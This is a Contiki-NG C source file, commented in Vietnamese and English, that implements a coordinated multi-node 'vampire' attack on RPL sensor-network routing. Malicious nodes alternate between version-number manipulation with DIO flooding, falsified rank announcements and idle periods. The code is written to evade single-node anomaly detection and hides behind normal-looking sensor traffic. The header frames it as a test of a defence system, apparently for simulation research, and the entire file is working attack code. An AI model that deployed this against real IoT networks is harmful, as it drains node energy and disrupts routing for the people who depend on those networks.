/*
 * VAMPIRE ATTACK: COORDINATED MULTI-NODE ATTACK
 * 
 * Mô tả: Tấn công phối hợp từ nhiều node độc hại cùng lúc
 *        Distributed attack để amplify damage và bypass single-node detection
 * 
 * Đặc điểm:
 *   - Multiple malicious nodes attack simultaneously
 *   - Zone-based attack: different nodes target different areas
 *   - Adaptive strategy: alternating between carousel and stretch
 *   - Time-coordinated: synchronized attack phases
 * 
 * Impact: 
 *   - Bypass single-node anomaly detection
 *   - Network-wide energy depletion
 *   - Harder to isolate and mitigate
 *   - Test defense system's scalability
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "COORDINATED"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Coordinated attack parameters */
#define NORMAL_SEND_INTERVAL        (10 * CLOCK_SECOND)
#define PHASE_SWITCH_INTERVAL       (45 * CLOCK_SECOND)  // Switch attack type
#define CAROUSEL_INTERVAL           (3 * CLOCK_SECOND)   // Medium rate
#define STRETCH_INTERVAL            (25 * CLOCK_SECOND)  // Medium rate

/* Attack phase types */
typedef enum {
    PHASE_CAROUSEL = 0,  // Version + DIO flooding
    PHASE_STRETCH = 1,   // Rank manipulation
    PHASE_IDLE = 2       // Idle phase to avoid detection
} attack_phase_t;

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;
static attack_phase_t current_phase = PHASE_CAROUSEL;

PROCESS(vampire_coordinated_process, "Vampire Coordinated Attack");
AUTOSTART_PROCESSES(&vampire_coordinated_process);

PROCESS_THREAD(vampire_coordinated_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer phase_timer;
  static struct etimer carousel_timer;
  static struct etimer stretch_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  static uint32_t attack_count = 0;
  static uint8_t phase_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("============================================\n");
  LOG_INFO("VAMPIRE ATTACK: COORDINATED MODE ACTIVATED\n");
  LOG_INFO("Node ID: %u\n", node_id);
  LOG_INFO("Attack strategy: Multi-node coordinated attack\n");
  LOG_INFO("TAG: ATTACK_TYPE=COORDINATED\n");
  LOG_INFO("============================================\n");
  
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  etimer_set(&phase_timer, PHASE_SWITCH_INTERVAL);
  
  /* Initial phase setup based on node ID for diversity */
  if(node_id % 3 == 0) {
      current_phase = PHASE_CAROUSEL;
      etimer_set(&carousel_timer, CAROUSEL_INTERVAL);
      LOG_INFO("Starting with CAROUSEL phase\n");
  } else if(node_id % 3 == 1) {
      current_phase = PHASE_STRETCH;
      etimer_set(&stretch_timer, STRETCH_INTERVAL);
      LOG_INFO("Starting with STRETCH phase\n");
  } else {
      current_phase = PHASE_IDLE;
      LOG_INFO("Starting with IDLE phase\n");
  }

  while(1) {
    PROCESS_WAIT_EVENT();

    /* PHASE SWITCHING for adaptive attack */
    if(ev == PROCESS_EVENT_TIMER && data == &phase_timer) {
        phase_count++;
        
        /* Rotate through attack phases */
        if(current_phase == PHASE_CAROUSEL) {
            current_phase = PHASE_STRETCH;
            etimer_stop(&carousel_timer);
            etimer_set(&stretch_timer, STRETCH_INTERVAL);
            LOG_INFO("COORDINATED_PHASE_SWITCH: CAROUSEL -> STRETCH (#%u) TAG:PHASE=STRETCH\n", phase_count);
        } 
        else if(current_phase == PHASE_STRETCH) {
            current_phase = PHASE_IDLE;
            etimer_stop(&stretch_timer);
            LOG_INFO("COORDINATED_PHASE_SWITCH: STRETCH -> IDLE (#%u) TAG:PHASE=IDLE\n", phase_count);
        }
        else {
            current_phase = PHASE_CAROUSEL;
            etimer_set(&carousel_timer, CAROUSEL_INTERVAL);
            LOG_INFO("COORDINATED_PHASE_SWITCH: IDLE -> CAROUSEL (#%u) TAG:PHASE=CAROUSEL\n", phase_count);
        }
        
        etimer_set(&phase_timer, PHASE_SWITCH_INTERVAL);
    }

    /* CAROUSEL PHASE: Version manipulation + DIO flooding */
    if(ev == PROCESS_EVENT_TIMER && data == &carousel_timer) {
        if(current_phase == PHASE_CAROUSEL && curr_instance.used) {
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += 7;  // Medium increment
            
            LOG_INFO("COORDINATED_ATTACK_CAROUSEL: version %u -> %u (attack #%lu) TAG:ACTION=VERSION_MANIP\n", 
                     old_version, curr_instance.dag.version, 
                     (unsigned long)++attack_count);
            
            /* Send 2 DIOs for moderate flooding */
            rpl_icmp6_dio_output(NULL);
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&carousel_timer, CAROUSEL_INTERVAL);
    }

    /* STRETCH PHASE: Rank manipulation */
    if(ev == PROCESS_EVENT_TIMER && data == &stretch_timer) {
        if(current_phase == PHASE_STRETCH && curr_instance.used && 
           curr_instance.dag.preferred_parent != NULL) {
            
            rpl_rank_t old_rank = curr_instance.dag.rank;
            
            /* Set high but not abnormally suspicious rank */
            curr_instance.dag.rank = 1200 + (random_rand() % 600);
            
            LOG_INFO("COORDINATED_ATTACK_STRETCH: rank %u -> %u TAG:ACTION=RANK_MANIP\n", 
                     old_rank, curr_instance.dag.rank);
            
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&stretch_timer, STRETCH_INTERVAL);
    }

    /* Normal data transmission (maintain cover) */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_DBG("NORMAL_TX node=%u seq=%lu phase=%d\n", 
                node_id, (unsigned long)p.seqno, current_phase);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
